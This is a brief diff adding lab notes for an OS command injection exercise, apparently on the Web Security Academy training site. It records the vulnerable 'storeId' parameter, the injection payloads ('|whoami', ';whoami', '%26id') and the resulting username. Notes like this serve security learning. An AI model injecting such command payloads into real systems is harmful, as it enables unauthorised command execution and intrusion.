@@ -1,0 +1,7 @@
+url : https://xxxxxxxx.web-security-academy.net
+Vulnerable url : https://xxxxxxx.web-security-academy.net/product?productId=1
+body of POST Request : productId=1&storeId=1
+Vulnerable Parameter : storeId
+payload : storeId=1|whoami,storeId=1;whoami,storeId=1%26id
+Response : peter-8uQhkW
+result: hi
